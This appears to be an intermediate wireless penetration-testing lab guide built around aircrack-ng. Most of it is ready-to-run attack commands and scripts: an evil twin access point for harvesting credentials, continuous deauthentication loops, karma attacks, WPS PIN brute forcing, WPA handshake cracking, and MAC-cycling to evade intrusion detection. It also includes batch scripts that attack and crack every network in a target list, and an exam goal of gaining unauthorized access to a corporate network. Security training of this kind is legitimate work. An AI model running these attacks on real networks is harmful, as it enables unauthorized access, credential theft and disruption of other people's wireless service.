# Aircrack-ng Intermediate Laboratory

**Objective**: Advance your wireless security testing skills with complex attack scenarios, enterprise networks, and professional assessment techniques.

---

## 🎯 Lab Prerequisites

### **Advanced Hardware Setup**
- Multiple wireless adapters (2+ for advanced attacks)
- Enterprise-grade wireless equipment
- Various target devices (Windows, Linux, macOS, mobile)
- Isolated enterprise network simulation

### **Software Requirements**
```bash
# Additional tools for intermediate exercises
sudo apt install -y hashcat john reaver pixiewps hostapd dnsmasq

# Python tools for automation
pip3 install scapy netfilterqueue

# Database tools for rainbow tables
sudo apt install -y sqlite3 postgresql-client
```

---

## 🏢 Phase 1: Enterprise Network Assessment

### **Exercise 1.1: WPA-Enterprise Reconnaissance**

**Objective**: Analyze enterprise wireless networks with 802.1X authentication.

**Setup Enterprise Network**:
```bash
# Configure hostapd for WPA-Enterprise
cat > enterprise_ap.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=Enterprise-Test
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eapol_version=2
own_ip_addr=192.168.100.1
auth_server_addr=192.168.100.2
auth_server_port=1812
auth_server_shared_secret=testing123
EOF

# Start enterprise AP
sudo hostapd enterprise_ap.conf
```

**Reconnaissance Commands**:
```bash
# Discover enterprise networks
airodump-ng -w enterprise_scan --output-format csv wlan0mon

# Target specific enterprise network
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w enterprise_target wlan0mon

# Analyze enterprise-specific management frames
airodump-ng -c 6 --bssid 00:11:22:33:44:55 --beacons --localtime wlan0mon
```

**Analysis Tasks**:
1. Identify WPA-Enterprise networks
2. Analyze authentication methods (EAP-TLS, EAP-PEAP, EAP-TTLS)
3. Examine certificate information
4. Document client authentication attempts

### **Exercise 1.2: EAP Method Analysis**

**Objective**: Understand different EAP authentication methods and their vulnerabilities.

**EAP-PEAP Analysis**:
```bash
# Capture EAP-PEAP authentication
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w eap_peap wlan0mon

# Filter for EAP frames in Wireshark
# Filter: eap || eapol
```

**EAP-TLS Analysis**:
```bash
# Capture certificate-based authentication
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w eap_tls wlan0mon

# Analyze certificate chains
# Use Wireshark to examine TLS handshake
```

---

## 🔧 Phase 2: Advanced Attack Techniques

### **Exercise 2.1: Evil Twin Attack**

**Objective**: Create convincing fake access points to capture credentials.

**Setup Evil Twin**:
```bash
# Create fake AP configuration
cat > evil_twin.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=TempPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
EOF

# Start evil twin AP
sudo hostapd evil_twin.conf &

# Configure DHCP server
sudo dnsmasq -C /dev/null -kd -F 192.168.100.50,192.168.100.150,12h -i wlan1 --bind-dynamic &

# Set up iptables for internet access
sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

**Deauthentication Attack**:
```bash
# Continuously deauth clients from legitimate AP
while true; do
    aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
    sleep 10
done
```

**Credential Harvesting**:
```bash
# Monitor evil twin for associations
airodump-ng -c 6 --bssid [EVIL_TWIN_MAC] -w evil_twin_victims wlan0mon

# Capture handshakes from evil twin
# Clients will connect and provide credentials
```

### **Exercise 2.2: Karma Attack**

**Objective**: Exploit client probe requests to create automatic connections.

**Karma Attack Setup**:
```bash
# Collect probe requests
airodump-ng -w probe_requests --output-format csv wlan0mon

# Extract SSIDs from probe requests
grep -v "^BSSID" probe_requests-01.csv | cut -d',' -f14 | sort -u > ssid_list.txt

# Create multiple fake APs
while read ssid; do
    if [ ! -z "$ssid" ]; then
        cat > "karma_${ssid}.conf" << EOF
interface=wlan1
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF
        sudo hostapd "karma_${ssid}.conf" &
        sleep 2
    fi
done < ssid_list.txt
```

### **Exercise 2.3: WPS PIN Attack**

**Objective**: Exploit WPS vulnerabilities to recover network credentials.

**WPS Discovery**:
```bash
# Scan for WPS-enabled networks
airodump-ng -w wps_scan --output-format csv wlan0mon

# Use reaver for WPS PIN attack
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv

# Pixie dust attack
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```

**WPS PIN Brute Force**:
```bash
# Systematic PIN attack
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 0 -x 60 -vv

# Use pixiewps for offline attack
sudo pixiewps -e [PKE] -r [PKR] -s [HASH1] -z [HASH2] -a [AUTHKEY] -n [ENONCE]
```

---

## 🔐 Phase 3: Advanced Cracking Techniques

### **Exercise 3.1: Rainbow Table Attacks**

**Objective**: Use precomputed rainbow tables for fast WPA cracking.

**Rainbow Table Creation**:
```bash
# Create rainbow table database
airolib-ng rainbow.db --create

# Import common SSIDs
echo "linksys" > common_ssids.txt
echo "netgear" >> common_ssids.txt
echo "dlink" >> common_ssids.txt
echo "belkin" >> common_ssids.txt

airolib-ng rainbow.db --import essid common_ssids.txt

# Import password list
airolib-ng rainbow.db --import passwd /usr/share/wordlists/rockyou.txt

# Generate PMK calculations
airolib-ng rainbow.db --batch

# Check statistics
airolib-ng rainbow.db --stats
```

**Rainbow Table Usage**:
```bash
# Crack using rainbow table
aircrack-ng -r rainbow.db handshake.cap

# Export results
airolib-ng rainbow.db --export cowpatty rainbow.cow
```

### **Exercise 3.2: GPU-Accelerated Cracking**

**Objective**: Use GPU acceleration for faster WPA cracking.

**Hashcat Integration**:
```bash
# Convert aircrack capture to hashcat format
aircrack-ng handshake.cap -J hashcat_format

# Use hashcat for GPU cracking
hashcat -m 2500 -a 0 hashcat_format.hccapx /usr/share/wordlists/rockyou.txt

# Custom rules for password generation
hashcat -m 2500 -a 0 hashcat_format.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

**John the Ripper Integration**:
```bash
# Convert to John format
aircrack-ng handshake.cap -J john_format

# Use John for cracking
john --wordlist=/usr/share/wordlists/rockyou.txt john_format.hccap

# Show cracked passwords
john --show john_format.hccap
```

### **Exercise 3.3: Mask Attacks**

**Objective**: Use targeted mask attacks for systematic password generation.

**Mask Attack Setup**:
```bash
# Create custom character sets
charset1="abcdefghijklmnopqrstuvwxyz"
charset2="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
charset3="0123456789"
charset4="!@#$%^&*"

# Mask examples
# ?d?d?d?d?d?d?d?d = 8 digits
# ?l?l?l?l?l?l?l?l = 8 lowercase
# ?u?l?l?l?l?l?d?d = Upper + 5 lower + 2 digits

# Run mask attack
hashcat -m 2500 -a 3 handshake.hccapx ?d?d?d?d?d?d?d?d
```

---

## 🛡️ Phase 4: Evasion and Stealth

### **Exercise 4.1: Advanced Evasion Techniques**

**Objective**: Avoid detection by wireless intrusion detection systems.

**Traffic Shaping**:
```bash
# Slow injection to avoid detection
aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon
sleep 30
aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon
sleep 45
# Continue with random delays
```

**MAC Address Cycling**:
```bash
# Script for MAC rotation
#!/bin/bash
for i in {1..100}; do
    # Generate random MAC
    mac=$(printf '00:11:22:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    
    # Change MAC address
    sudo ifconfig wlan0mon down
    sudo macchanger -m $mac wlan0mon
    sudo ifconfig wlan0mon up
    
    # Perform attack
    aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon
    
    # Wait before next iteration
    sleep $((RANDOM % 60 + 30))
done
```

**Packet Timing Manipulation**:
```bash
# Variable timing injection
aireplay-ng -0 5 -a 00:11:22:33:44:55 --delay $((RANDOM % 2000 + 500)) wlan0mon
```

### **Exercise 4.2: Covert Channels**

**Objective**: Use wireless networks for covert communication.

**Beacon Frame Covert Channel**:
```bash
# Create covert beacon frames
packetforge-ng -0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -k 192.168.1.1 -l 192.168.1.100 -y fragment.xor -w covert.cap

# Inject covert data
aireplay-ng -2 -r covert.cap wlan0mon
```

---

## 📊 Phase 5: Automated Attack Frameworks

### **Exercise 5.1: Wifite Integration**

**Objective**: Use automated wireless attack frameworks for comprehensive testing.

**Wifite Setup**:
```bash
# Install wifite
sudo apt install wifite

# Basic automated attack
sudo wifite --kill

# Specific target attack
sudo wifite --bssid 00:11:22:33:44:55

# WPS-only attack
sudo wifite --wps-only

# Custom wordlist
sudo wifite --dict custom_wordlist.txt
```

**Custom Wifite Configuration**:
```bash
# Create custom config
cat > wifite_config.py << 'EOF'
#!/usr/bin/env python3

# Custom configuration for wifite
WPA_ATTACK_TIMEOUT = 300
WPA_HANDSHAKE_TIMEOUT = 60
WPS_ATTACK_TIMEOUT = 1800
WPS_FAIL_THRESHOLD = 100
WPS_TIMEOUT_THRESHOLD = 10
EOF
```

### **Exercise 5.2: Custom Attack Scripts**

**Objective**: Develop custom automation scripts for specific scenarios.

**Automated Handshake Capture**:
```bash
#!/bin/bash
# handshake_hunter.sh

TARGET_BSSID="$1"
CHANNEL="$2"
INTERFACE="wlan0mon"

if [ -z "$TARGET_BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL>"
    exit 1
fi

# Start monitoring
airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w handshake_$(date +%Y%m%d_%H%M%S) $INTERFACE &
AIRODUMP_PID=$!

# Wait for clients to associate
sleep 30

# Deauthenticate clients
for i in {1..10}; do
    aireplay-ng -0 5 -a $TARGET_BSSID $INTERFACE
    sleep 15
done

# Stop monitoring
kill $AIRODUMP_PID

echo "Handshake capture complete"
```

**Multi-Target Attack Script**:
```bash
#!/bin/bash
# multi_target_attack.sh

# Read targets from file
while read line; do
    BSSID=$(echo $line | cut -d',' -f1)
    CHANNEL=$(echo $line | cut -d',' -f2)
    ESSID=$(echo $line | cut -d',' -f3)
    
    echo "Attacking $ESSID ($BSSID) on channel $CHANNEL"
    
    # Capture handshake
    timeout 300 airodump-ng -c $CHANNEL --bssid $BSSID -w "${ESSID}_handshake" wlan0mon &
    CAPTURE_PID=$!
    
    # Deauth attack
    sleep 30
    aireplay-ng -0 10 -a $BSSID wlan0mon
    
    wait $CAPTURE_PID
    
    # Attempt to crack
    if [ -f "${ESSID}_handshake-01.cap" ]; then
        aircrack-ng -w /usr/share/wordlists/rockyou.txt "${ESSID}_handshake-01.cap"
    fi
    
    sleep 60
done < targets.txt
```

---

## 🔍 Phase 6: Advanced Analysis

### **Exercise 6.1: Traffic Pattern Analysis**

**Objective**: Analyze wireless traffic patterns for security assessment.

**Statistical Analysis**:
```bash
# Analyze capture files
python3 << 'EOF'
import pandas as pd
import matplotlib.pyplot as plt
from scapy.all import *

# Load capture file
packets = rdpcap("capture.cap")

# Analyze frame types
frame_types = {}
for packet in packets:
    if packet.haslayer(Dot11):
        frame_type = packet[Dot11].type
        frame_types[frame_type] = frame_types.get(frame_type, 0) + 1

# Create visualization
plt.figure(figsize=(10, 6))
plt.bar(frame_types.keys(), frame_types.values())
plt.title("802.11 Frame Type Distribution")
plt.xlabel("Frame Type")
plt.ylabel("Count")
plt.savefig("frame_analysis.png")
plt.show()
EOF
```

### **Exercise 6.2: Forensic Analysis**

**Objective**: Conduct forensic analysis of wireless attack evidence.

**Timeline Reconstruction**:
```bash
# Extract timestamps and events
tshark -r capture.cap -T fields -e frame.time -e wlan.sa -e wlan.da -e wlan.fc.type_subtype -e wlan_mgt.ssid > timeline.csv

# Analyze authentication sequences
tshark -r capture.cap -Y "wlan.fc.subtype == 0x0B" -T fields -e frame.time -e wlan.sa -e wlan.da -e wlan.fixed.status_code

# Identify attack patterns
tshark -r capture.cap -Y "wlan.fc.subtype == 0x0C" -T fields -e frame.time -e wlan.sa -e wlan.da -e wlan.fixed.reason_code
```

---

## 📈 Phase 7: Performance and Optimization

### **Exercise 7.1: Attack Speed Optimization**

**Objective**: Optimize attack speed and efficiency.

**Parallel Processing**:
```bash
# Parallel handshake capture
#!/bin/bash
for target in $(cat targets.txt); do
    {
        BSSID=$(echo $target | cut -d',' -f1)
        CHANNEL=$(echo $target | cut -d',' -f2)
        
        # Capture handshake in background
        timeout 300 airodump-ng -c $CHANNEL --bssid $BSSID -w "handshake_$BSSID" wlan0mon &
        
        # Deauth attack
        sleep 30
        aireplay-ng -0 10 -a $BSSID wlan0mon
    } &
done
wait
```

**Resource Management**:
```bash
# Monitor system resources
#!/bin/bash
while true; do
    echo "CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)"
    echo "Memory: $(free -m | grep Mem | awk '{print ($3/$2)*100}')"
    echo "Disk: $(df -h | grep '/dev/sda1' | awk '{print $5}')"
    sleep 60
done
```

---

## 🎓 Lab Assessment

### **Practical Examination**

**Scenario**: Enterprise wireless penetration test
- Target: Mixed WPA2-PSK and WPA2-Enterprise environment
- Objective: Gain unauthorized access to corporate network
- Constraints: Stealth required, minimal disruption
- Deliverables: Technical report with evidence

**Assessment Criteria**:
- [ ] Comprehensive reconnaissance
- [ ] Successful credential recovery
- [ ] Evasion technique effectiveness
- [ ] Documentation quality
- [ ] Ethical considerations

### **Advanced Challenges**

**Challenge 1**: Crack WPA2-Enterprise without user credentials
**Challenge 2**: Bypass MAC filtering using captured traffic
**Challenge 3**: Maintain persistent access through firmware modification
**Challenge 4**: Develop custom attack tool for specific vulnerability

---

## 📚 Professional Development

### **Industry Certifications**
- CWSP (Certified Wireless Security Professional)
- OSWP (Offensive Security Wireless Professional)
- CISSP (Certified Information Systems Security Professional)

### **Continuous Learning**
- Research emerging wireless standards (WPA3, Wi-Fi 6)
- Study IoT and embedded wireless security
- Participate in security conferences and workshops
- Contribute to open-source wireless security projects

---

*Intermediate Lab Complete - Ready for Expert-Level Challenges*
